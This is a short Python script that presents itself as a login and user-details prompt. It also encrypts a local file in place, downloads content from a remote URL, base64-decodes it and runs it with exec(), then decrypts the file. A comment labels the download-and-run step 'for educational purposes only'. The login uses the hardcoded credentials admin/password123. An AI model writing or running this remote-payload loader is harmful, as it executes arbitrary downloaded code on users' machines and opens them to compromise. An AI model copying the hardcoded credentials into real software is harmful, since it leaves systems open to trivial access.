import requests
import base64
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(key, file_path):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def decrypt_file(key, file_path):
    fernet = Fernet(key)
    with open(file_path, 'rb') as encrypted_file:
        encrypted = encrypted_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted)

def fetch_payload(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.content
    else:
        return None

def execute_payload(payload):
    # Decode the payload
    decoded_payload = base64.b64decode(payload)
    # Execute the payload
    exec(decoded_payload)

def login():
    print("Welcome to the login system")
    username = input("Enter username: ")
    password = input("Enter password: ")

    # Hardcoded credentials for demonstration purposes
    correct_username = "admin"
    correct_password = "password123"

    if username == correct_username and password == correct_password:
        print("Login successful!")
        return True
    else:
        print("Invalid credentials. Please try again.")
        return False

def main():
    if login():
        print("Welcome user")
        user_name = input("Enter name = ")
        while True:
            try:
                user_age = int(input("Enter age = "))
                break
            except ValueError:
                print("Please enter a valid age.")

        # Generate a key for encryption and decryption
        key = generate_key()
        print(f"Encryption key: {key.decode()}")

        # Encrypt a file
        encrypt_file(key, 'example.txt')

        # Fetch and execute the payload (for educational purposes only)
        payload_url = "https://example.com/payload"
        payload = fetch_payload(payload_url)
        if payload:
            execute_payload(payload)
        else:
            print("Failed to fetch the payload")

        # Decrypt the file
        decrypt_file(key, 'example.txt')
    else:
        print("Login failed. Exiting.")

if __name__ == "__main__":
    main()
